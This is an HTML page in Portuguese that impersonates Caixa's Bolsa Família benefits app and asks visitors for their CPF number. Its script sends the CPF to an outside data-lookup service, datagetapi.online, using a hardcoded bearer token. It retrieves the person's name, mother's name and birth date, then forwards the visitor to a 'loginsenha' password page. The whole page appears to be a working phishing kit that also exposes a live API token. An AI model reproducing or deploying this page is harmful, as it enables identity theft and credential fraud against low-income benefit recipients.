
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Aplicativo Bolsa Família</title>
  <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Rawline', sans-serif;
      background: white;
      color: #00496D;
      padding: 20px;
      text-align: center;
    }
    .logo {
      width: 140px;
      margin: 0 auto;
      display: block;
    }
    h2 {
      font-size: 16px;
      font-weight: 600;
      margin: 8px 0 24px;
      color: #1a73e8;
    }
    .descricao {
      font-size: 18px;
      font-weight: 400;
      margin-bottom: 24px;
      color: #2b4d50;
      padding: 0 30px;
    }
    .input-group {
      display: flex;
      align-items: center;
      border-bottom: 2px solid #d6802f;
      max-width: 380px;
      margin: 0 auto 24px;
      padding: 6px 0;
    }
    .input-group img {
      width: 22px;
      margin-right: 8px;
    }
    input[type="text"] {
      border: none;
      outline: none;
      font-size: 16px;
      flex: 1;
      color: #2b4d50;
      font-family: 'Rawline', sans-serif;
    }
    .btn {
      background-color: #d6802f;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 600;
      width: 100%;
      max-width: 380px;
      cursor: pointer;
      margin: 0 auto 32px;
      display: block;
      font-family: 'Rawline', sans-serif;
    }
    .ajuda {
      color: #1a73e8;
      font-weight: 600;
      font-size: 15px;
      text-decoration: underline;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 6px;
      font-family: 'Rawline', sans-serif;
    }
    .ajuda img {
      width: 20px;
    }
  </style>
</head>
<body>
  <img src="caixa logo.webp" alt="Logo Caixa" class="logo">
  <h2>Aplicativo Bolsa Família</h2>
  <p class="descricao">
    Informe seu CPF e clique em "Próximo" para continuar:
  </p>
  <div id="erroCPF" style="display:none;background:#ffe5e5;color:#cc0000;font-weight:600;padding:12px;margin:0 auto 16px;max-width:380px;border-radius:6px;">CPF Inválido</div>
  <div class="input-group">
    <img src="icone-user webp.webp" alt="CPF">
    <input type="text" id="cpfInput" placeholder="CPF" maxlength="14" oninput="formatarInputCPF(this)">
  </div>
  <button class="btn" onclick="consultarCPF()">Próximo</button>
  <a href="#" class="ajuda">
    <img src="icone-ajuda webp.webp" alt="Ajuda">
    Preciso de ajuda
  </a>



<script>
function getQueryParam(param) {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
  } catch (e) {
    console.error("Erro ao ler parâmetro da URL:", e);
    return null;
  }
}

async function consultarCPF() {
  const erroEl = document.getElementById('erroCPF');
  erroEl.style.display = 'none';

  const cpf = document.getElementById('cpfInput').value.replace(/\D/g, '');
  if (!cpf || cpf.length < 11) {
    erroEl.style.display = 'block';
    return;
  }

  try {
    const response = await fetch(`https://datagetapi.online/api/v1/cpf/${cpf}`, {
      method: 'GET',
      headers: {
        'Authorization': 'Bearer fed55ffa1d483c9d8770ed3e2187823fa268d5f70b27fb66badb3284eca6d5db'
      }
    });

    if (response.ok) {
      const data = await response.json();
      console.log('Dados do CPF:', data);
      window.location.href = `loginsenha?cpf=${cpf}&nome=${encodeURIComponent(data.NOME || '')}&mae=${encodeURIComponent(data.NOME_MAE || '')}&nasc=${encodeURIComponent(data.NASC || '')}`;
    } else {
      erroEl.style.display = 'block';
    }
  } catch (error) {
    erroEl.style.display = 'block';
    console.error(error);
  }
}

function formatarInputCPF(input) {
  let value = input.value.replace(/\D/g, "").slice(0, 11);
  value = value.replace(/(\d{3})(\d)/, "$1.$2");
  value = value.replace(/(\d{3})(\d)/, "$1.$2");
  value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
  input.value = value;
}

</script>
</body>
